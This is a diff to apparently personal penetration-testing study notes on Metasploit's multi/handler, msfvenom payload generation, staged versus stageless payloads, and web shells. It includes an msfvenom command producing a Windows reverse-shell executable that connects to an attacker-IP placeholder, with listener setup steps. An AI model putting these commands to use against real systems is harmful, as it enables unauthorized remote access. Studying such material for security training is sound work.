@@ -98,11 +98,18 @@
 		- `exploit/multi/handler` module, used to receive reverse shells.
 		- The only way to interact with a `meterpreter` shell.
 		- The easiest way to handle staged payloads.
+		- 3 options we need to set when using multi/handler
+			- `set payload <payload>`
+			- `set lhost <attacker-ip>`
+			- `set lport <attacker-port>`
+		- The payload should be set according to the type of shell to be used.
+		- Then use `exploit -j` to launch the module, running as a job in the background.
+		- Using `sessions` to list the sessions and `sessions <session-id>` to foreground the session.
 	- #### Msfvenom
 		- Generates payload like reverse shells, bind shells and many more.
 		- `msfvenom -p <payload> <options>`.
 		- `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe lhost=<attacker-ip> lport=<attacker-port>`.
-			- `-f` output format, `exe, elf, aspx, war, py`.
+			- `-f` output format, like `exe, elf, aspx, war, py`.
 		- **Staged**
 			- Payloads are sent in two parts
 				- The first part is called the stager, piece of code executed directly on the target itself. Connects back to a waiting listener, but doesn't actually contain any reverse shell code. Used to load the real payload, executing it directly and preventing it from touching the disk where it could get caught by anti-virus solutions.
@@ -118,3 +125,8 @@
 				- A Windows 64 bit staged Meterpreter payload `windows/x64/meterpreter/reverse_tcp`.
 				- A Linux 32 bit stageless Meterpreter payload `linux/x86/meterpreter_reverse_tcp`.
 		- List payloads with `msfvenom --list payloads`.
+	- ### *WebShells*
+		- When we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a web shell.
+		- A script that runs inside a web server (usually in a language such as PHP or ASP) which executes code on the server.
+		- Essentially, commands are entered into a web page, either through a HTML form, or directly as arguments in the URL,  which are then executed by the script, with the results returned and written to the page.
+		- Web shells on Kali are located in `/usr/share/webshells`.
